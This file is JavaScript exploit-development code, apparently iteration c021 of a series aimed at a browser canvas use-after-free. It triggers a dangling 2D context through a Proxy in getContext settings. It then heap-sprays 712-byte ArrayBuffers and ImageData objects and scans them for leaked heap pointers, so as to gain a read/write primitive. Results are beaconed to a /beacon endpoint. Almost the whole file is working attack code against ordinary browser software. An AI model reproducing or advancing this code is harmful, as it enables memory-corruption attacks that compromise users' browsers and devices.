// c021: which allocation actually shares the freed context's size class? Two cheap variants, one run.
//
// c018/c019 killed the timing and deferred-free theories: same-type reclaim always works, ArrayBuffer(768)
// never does. c020 was too heavy and the WebProcess hit the memory modal before it ran, so this version spends
// far less memory: 400 objects per spray, one short churn instead of 192MB, no 700-canvas flush (proven
// useless in c019).
//
// Variant A: AB712     - ArrayBuffer(712), the object's exact size. Rules out a class-rounding miss.
// Variant B: IMG178    - createImageData(178,1) = 712 bytes via fastMalloc, and JS can read AND write it.
//                        If this overlaps, the scan finds a pointer the engine wrote, and we have a window
//                        into the object's own fields - which is the primitive, not just a diagnostic.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c021-' + LOG[i]); } catch (e) {} } }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function proxySettings(c, cap) {
    var fired = false;
    function fire() { if (!fired) { fired = true; cap.inner = c.getContext('2d'); } }
    return new Proxy({}, { get: function () { fire(); return false; }, has: function () { fire(); return true; } });
  }
  function mkCanvas(i) {
    var c = document.createElement('canvas');
    c.width = 8; c.height = 8; c.id = 's' + i;
    return [c, c.getContext('2d')];
  }

  async function groom(tag) {
    var cap = { inner: null, outer: null };
    var c1 = document.createElement('canvas');
    c1.width = 8; c1.height = 8; c1.id = 'orig';
    try { cap.outer = c1.getContext('2d', proxySettings(c1, cap)); } catch (e) { note(tag + ':trigger-err'); return null; }
    var sp = [];
    for (var i = 0; i < 500; i++) sp.push(mkCanvas(i));
    var idx = -1;
    try {
      var ident = cap.inner.canvas.id;
      if (ident && ident.charAt(0) === 's') idx = parseInt(ident.slice(1), 10);
    } catch (e) { note(tag + ':alias-err:' + e.name); return null; }
    if (idx < 0) { note(tag + ':no-alias'); return null; }
    var keep = sp[idx]; sp[idx] = null; keep[0] = null; keep[1] = null;
    try { var j = []; for (var m = 0; m < 2; m++) j.push(new Float64Array(4 * 1024 * 1024)); j = null; } catch (e) {}
    await sleep(1000);
    note(tag + ':groom@' + idx);
    return cap;
  }

  // canonical-looking x86-64 heap pointer inside a 0x5a-filled buffer
  function scan(buf) {
    for (var i = 0; i + 8 <= buf.length; i += 4) {
      var g = true;
      for (var k = 0; k < 4; k++) if (buf[i + k] !== 0x5a) { g = false; break; }
      if (g) continue;
      if (buf[i + 6] === 0 && buf[i + 7] === 0 && buf[i + 5] === 0) return i;
    }
    return -1;
  }

  (async function () {
    note('boot');

    // --- A: ArrayBuffer(712) ---
    var cap = await groom('A');
    if (cap) {
      var abs = [];
      for (var i = 0; i < 400; i++) { var ab = new ArrayBuffer(712); var u = new Uint8Array(ab); for (var s = 0; s < 712; s++) u[s] = 0x5a; abs.push(ab); }
      await sleep(250);
      try { cap.inner.beginPath(); } catch (e) { note('A:beginPath-err:' + e.name); }
      var hit = -1;
      for (var a = 0; a < abs.length && hit < 0; a++) if (scan(new Uint8Array(abs[a])) >= 0) hit = a;
      note('A:HIT=' + hit);
      abs = null;
    }

    // --- B: ImageData(178,1) = 712 bytes ---
    cap = await groom('B');
    if (cap) {
      var cx = document.createElement('canvas').getContext('2d');
      var imgs = [];
      for (i = 0; i < 400; i++) {
        var im = cx.createImageData(178, 1);
        var d = im.data;
        for (s = 0; s < d.length; s++) d[s] = 0x5a;
        imgs.push(im);
      }
      await sleep(250);
      try { cap.inner.beginPath(); } catch (e) { note('B:beginPath-err:' + e.name); }
      var hit2 = -1, off2 = -1;
      for (a = 0; a < imgs.length && hit2 < 0; a++) {
        var o = scan(imgs[a].data);
        if (o >= 0) { hit2 = a; off2 = o; }
      }
      note('B:HIT=' + hit2 + '@' + off2);
      imgs = null;
    }

    note('done');
    flush();
  })();
})();
